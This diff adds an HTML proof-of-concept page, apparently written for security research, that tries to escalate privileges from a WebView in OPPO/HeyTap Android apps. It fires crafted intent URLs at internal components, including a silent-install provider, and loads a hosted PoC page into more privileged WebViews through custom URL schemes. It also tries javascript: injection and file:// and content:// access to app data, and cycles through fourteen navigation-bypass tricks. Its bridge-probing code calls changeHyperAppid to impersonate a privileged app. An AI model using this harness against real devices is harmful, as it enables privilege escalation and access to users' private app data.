@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebView Escalation Test</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            padding: 20px;
+            background: #1a1a2e;
+            color: #fff;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 8px;
+        }
+
+        button {
+            background: #e94560;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            margin: 5px;
+            display: block;
+            width: 100%;
+            text-align: left;
+        }
+
+        button:active {
+            opacity: 0.8;
+        }
+
+        pre {
+            background: #0f0f23;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 0.75em;
+            word-break: break-all;
+        }
+
+        .section {
+            margin: 15px 0;
+        }
+
+        h3 {
+            color: #e94560;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>🔓 WebView Escalation Test</h1>
+    <p>Try to open more privileged WebViews or activities from this context</p>
+
+    <div class="card">
+        <h3>1. Intent URLs (Activity Launch)</h3>
+        <div class="section">
+            <button
+                onclick="tryIntent('intent://settings/#Intent;scheme=android-app;package=com.android.settings;end')">
+                📱 Open Android Settings
+            </button>
+            <button onclick="tryIntent('intent://#Intent;component=com.oplus.games/.MainActivity;end')">
+                🎮 Open Games MainActivity
+            </button>
+            <button
+                onclick="tryIntent('intent://#Intent;component=com.oplus.games/.provider.SilentInstallProvider;end')">
+                ⚠️ Try SilentInstallProvider
+            </button>
+            <button
+                onclick="tryIntent('intent://cloud.heytap.com/route#Intent;scheme=htcloud;package=com.heytap.cloud;end')">
+                ☁️ Open HeytapCloud WebView
+            </button>
+            <button onclick="tryIntent('intent://theme/web#Intent;scheme=oaps;package=com.oplus.themestore;end')">
+                🎨 Open ThemeStore WebView
+            </button>
+        </div>
+    </div>
+
+    <div class="card">
+        <h3>2. Open PoC in OTHER App's WebView</h3>
+        <p style="color:#94a3b8;font-size:0.8em;">Try to open index.html in a more privileged WebView</p>
+        <div class="section">
+            <button
+                onclick="tryLink('htcloud://cloud.heytap.com/route?url=https://youichi-uda.github.io/oppo-game-poc/')">
+                ☁️ htcloud:// → PoC
+            </button>
+            <button onclick="tryLink('oaps://theme/web?url=https://youichi-uda.github.io/oppo-game-poc/')">
+                🎨 oaps://theme → PoC
+            </button>
+            <button onclick="tryLink('heytapbrowser://webpage/view?url=https://youichi-uda.github.io/oppo-game-poc/')">
+                🌐 heytapbrowser:// → PoC
+            </button>
+            <button
+                onclick="tryLink('healthcheck://remotediagnosis.verify?url=https://youichi-uda.github.io/oppo-game-poc/')">
+                🏥 healthcheck:// → PoC
+            </button>
+            <button onclick="tryLink('postmanservice://open?url=https://youichi-uda.github.io/oppo-game-poc/')">
+                📬 postmanservice:// → PoC
+            </button>
+            <button
+                onclick="tryLink('intent://youichi-uda.github.io/oppo-game-poc/#Intent;scheme=https;package=com.heytap.cloud;end')">
+                ☁️ intent → HeytapCloud
+            </button>
+            <button
+                onclick="tryLink('intent://youichi-uda.github.io/oppo-game-poc/#Intent;scheme=https;package=com.oplus.themestore;end')">
+                🎨 intent → ThemeStore
+            </button>
+            <button
+                onclick="tryLink('intent://youichi-uda.github.io/oppo-game-poc/#Intent;scheme=https;action=android.intent.action.VIEW;end')">
+                � intent → any browser
+            </button>
+        </div>
+    </div>
+
+    <div class="card">
+        <h3>3. JavaScript Scheme</h3>
+        <div class="section">
+            <button onclick="tryLink('javascript:alert(document.domain)')">
+                ⚡ javascript: alert
+            </button>
+            <button
+                onclick="tryLink('javascript:window.location=\\'intent://settings/#Intent;scheme=android-app;end\\'')">
+                ⚡ javascript: → intent
+            </button>
+        </div>
+    </div>
+
+    <div class="card">
+        <h3>4. File Access</h3>
+        <div class="section">
+            <button onclick="tryLink('file:///sdcard/Download/')">
+                📁 file:// sdcard
+            </button>
+            <button onclick="tryLink('file:///data/data/com.oplus.games/')">
+                📁 file:// app data (likely blocked)
+            </button>
+            <button onclick="tryLink('content://com.oplus.games.provider/files')">
+                📁 content:// provider
+            </button>
+        </div>
+    </div>
+
+    <div class="card">
+        <h3>5. HyperJsbridge Escalation</h3>
+        <div class="section">
+            <button onclick="tryBridgeEscalation()">
+                🔧 Try all HyperJsbridge methods
+            </button>
+        </div>
+        <pre id="bridge-result">Click to test</pre>
+    </div>
+
+    <div class="card">
+        <h3>6. Bypass Methods (select URL above first)</h3>
+        <div class="section">
+            <button onclick="method1()">1: location.href</button>
+            <button onclick="method2()">2: location.assign</button>
+            <button onclick="method3()">3: location.replace</button>
+            <button onclick="method4()">4: window.open _blank</button>
+            <button onclick="method5()">5: window.open _self</button>
+            <button onclick="method6()">6: iframe</button>
+            <button onclick="method7()">7: anchor click</button>
+            <button onclick="method8()">8: anchor _blank</button>
+            <button onclick="method9()">9: form GET</button>
+            <button onclick="method10()">10: meta refresh</button>
+            <button onclick="method12()">12: setTimeout</button>
+            <button onclick="method13()">13: HyperJsbridge</button>
+            <button onclick="method14()">14: Blob URL</button>
+            <button onclick="tryAllMethods()" style="background:#16a34a;">🚀 Try ALL</button>
+        </div>
+        <p style="color:#94a3b8;font-size:0.8em;">Current URL: <span id="current-url">none</span></p>
+    </div>
+
+    <div class="card">
+        <h3>Log</h3>
+        <pre id="log"></pre>
+    </div>
+
+    <script>
+        const log = (msg) => {
+            const el = document.getElementById('log');
+            el.textContent = `[${new Date().toLocaleTimeString()}] ${msg}\n` + el.textContent;
+        };
+
+        const tryIntent = (intentUrl) => {
+            log(`Trying intent: ${intentUrl}`);
+            try {
+                window.location.href = intentUrl;
+            } catch (e) {
+                log(`Error: ${e.message}`);
+            }
+        };
+
+        const tryLink = (url) => {
+            log(`Selected: ${url}`);
+            currentUrl = url;
+            document.getElementById('current-url').textContent = url;
+        };
+
+        let currentUrl = '';
+
+        // Method 1: Direct location
+        const method1 = () => {
+            log('Method 1: window.location.href');
+            window.location.href = currentUrl;
+        };
+
+        // Method 2: location.assign
+        const method2 = () => {
+            log('Method 2: location.assign');
+            window.location.assign(currentUrl);
+        };
+
+        // Method 3: location.replace
+        const method3 = () => {
+            log('Method 3: location.replace');
+            window.location.replace(currentUrl);
+        };
+
+        // Method 4: window.open
+        const method4 = () => {
+            log('Method 4: window.open');
+            window.open(currentUrl, '_blank');
+        };
+
+        // Method 5: window.open _self
+        const method5 = () => {
+            log('Method 5: window.open _self');
+            window.open(currentUrl, '_self');
+        };
+
+        // Method 6: iframe inject
+        const method6 = () => {
+            log('Method 6: iframe');
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = currentUrl;
+            document.body.appendChild(iframe);
+        };
+
+        // Method 7: anchor click
+        const method7 = () => {
+            log('Method 7: anchor click');
+            const a = document.createElement('a');
+            a.href = currentUrl;
+            a.click();
+        };
+
+        // Method 8: anchor with target _blank
+        const method8 = () => {
+            log('Method 8: anchor target=_blank');
+            const a = document.createElement('a');
+            a.href = currentUrl;
+            a.target = '_blank';
+            document.body.appendChild(a);
+            a.click();
+        };
+
+        // Method 9: form submit GET
+        const method9 = () => {
+            log('Method 9: form GET');
+            const form = document.createElement('form');
+            form.method = 'GET';
+            form.action = currentUrl;
+            document.body.appendChild(form);
+            form.submit();
+        };
+
+        // Method 10: meta refresh (delayed)
+        const method10 = () => {
+            log('Method 10: meta refresh');
+            const meta = document.createElement('meta');
+            meta.httpEquiv = 'refresh';
+            meta.content = `0;url=${currentUrl}`;
+            document.head.appendChild(meta);
+        };
+
+        // Method 11: document.write
+        const method11 = () => {
+            log('Method 11: document.write redirect');
+            document.write(`<script>location='${currentUrl}'<\/script>`);
+        };
+
+        // Method 12: setTimeout + location
+        const method12 = () => {
+            log('Method 12: setTimeout location');
+            setTimeout(() => { window.location = currentUrl; }, 100);
+        };
+
+        // Method 13: Use HyperJsbridge if available
+        const method13 = () => {
+            log('Method 13: HyperJsbridge');
+            if (typeof HyperJsbridge !== 'undefined') {
+                // Try various potential methods
+                try { HyperJsbridge.openUrl && HyperJsbridge.openUrl(currentUrl); } catch (e) { }
+                try { HyperJsbridge.open && HyperJsbridge.open(currentUrl); } catch (e) { }
+                try { HyperJsbridge.loadUrl && HyperJsbridge.loadUrl(currentUrl); } catch (e) { }
+                try { HyperJsbridge.navigate && HyperJsbridge.navigate(currentUrl); } catch (e) { }
+                try { HyperJsbridge.startActivity && HyperJsbridge.startActivity(currentUrl); } catch (e) { }
+                log('Tried all HyperJsbridge methods');
+            } else {
+                log('HyperJsbridge not available');
+            }
+        };
+
+        // Method 14: Blob URL wrapper
+        const method14 = () => {
+            log('Method 14: Blob redirect');
+            const html = `<html><head><meta http-equiv="refresh" content="0;url=${currentUrl}"></head></html>`;
+            const blob = new Blob([html], { type: 'text/html' });
+            window.location = URL.createObjectURL(blob);
+        };
+
+        // Try all methods
+        const tryAllMethods = () => {
+            log('=== Trying all methods ===');
+            [method7, method8, method6, method4, method5, method9, method10, method12, method13].forEach((m, i) => {
+                setTimeout(() => {
+                    try { m(); } catch (e) { log(`Method ${i + 1} error: ${e.message}`); }
+                }, i * 500);
+            });
+        };
+
+        const tryBridgeEscalation = () => {
+            const el = document.getElementById('bridge-result');
+            el.textContent = 'Testing HyperJsbridge methods...\n';
+
+            if (typeof HyperJsbridge === 'undefined') {
+                el.textContent += 'HyperJsbridge not available\n';
+                return;
+            }
+
+            // Try to enumerate and call all methods
+            for (let key in HyperJsbridge) {
+                el.textContent += `Method: ${key}\n`;
+                try {
+                    if (typeof HyperJsbridge[key] === 'function') {
+                        // Try calling with various inputs
+                        el.textContent += `  Trying ${key}()...\n`;
+
+                        // Test with different payloads
+                        if (key === 'changeHyperAppid') {
+                            // Try to change to a privileged appid
+                            try {
+                                HyperJsbridge.changeHyperAppid('com.heytap.market');
+                                el.textContent += `  changeHyperAppid('com.heytap.market') - OK\n`;
+                            } catch (e) {
+                                el.textContent += `  Error: ${e.message}\n`;
+                            }
+                        }
+
+                        if (key === 'playNow') {
+                            el.textContent += `  playNow available - can trigger game launch\n`;
+                        }
+                    }
+                } catch (e) {
+                    el.textContent += `  Error on ${key}: ${e.message}\n`;
+                }
+            }
+
+            // Try to find hidden methods
+            el.textContent += '\nSearching for hidden properties...\n';
+            try {
+                const props = Object.getOwnPropertyNames(HyperJsbridge);
+                el.textContent += `Properties: ${props.join(', ')}\n`;
+            } catch (e) {
+                el.textContent += `Error: ${e.message}\n`;
+            }
+        };
+
+        log('Escalation test page loaded');
+        log(`Current URL: ${window.location.href}`);
+    </script>
+</body>
+
+</html>
